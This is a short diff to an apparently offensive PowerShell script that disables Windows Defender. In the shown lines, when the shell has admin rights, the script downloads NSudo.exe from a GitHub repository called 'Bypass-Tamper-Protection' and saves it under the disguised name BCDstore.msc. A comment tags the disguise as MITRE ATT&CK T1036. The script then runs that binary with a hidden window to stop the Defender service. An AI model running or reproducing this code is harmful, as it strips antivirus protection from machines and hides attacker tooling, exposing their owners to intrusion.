@@ -153,11 +153,11 @@ If($Action -ieq "Query"){## Query Windows Defender state
    If($IsClientAdmin -ieq "True"){## Shell running under Admin privileges
 
       ## Download standalone binary from @swagkarna github repository
-      # And Masquerade standalone executable to look like one .msc archive
+      # And Masquerade standalone executable to look like one .msc archive { MITRE ATT&CK T1036 }
       powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe','$Env:TMP\BCDstore.msc') }"
       If(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue){
 
-         cd $Env:TMP;.\BCDstore.msc -U:T -ShowWindowMode:Hide sc stop $ServiceName
+         cd $Env:TMP;.\BCDstore.msc -U:T -Wait -ShowWindowMode:Hide sc stop $ServiceName
          cd $Working_Directory ## Return to @redpill working directory
 
       }Else{## [error] failed to download Nsudo.exe {Masquerade of: BCDstore.msc}
